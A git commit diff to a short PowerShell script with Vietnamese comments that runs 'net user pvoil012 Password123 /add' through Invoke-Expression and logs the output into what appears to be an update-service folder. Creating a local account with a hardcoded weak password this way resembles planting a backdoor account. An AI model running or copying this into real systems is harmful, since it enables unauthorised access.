94e94d0e4eb51cbbfa25641db24ccac20187eaf4
BlueC <68144101+bluecrypt47@users.noreply.github.com>
2024-05-16 17:11:01 +0700

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -2,7 +2,7 @@
 
 # Lệnh PowerShell cần thực hiện
 
-$command = "net user pvoil012 Password123 /add"
+$command = "net user pvoil012 Password123 /add > F:\FTS\Service\UpdateService_PVOIL\Update\outs.txt"
 
 # Thực thi lệnh
 Invoke-Expression -Command $command
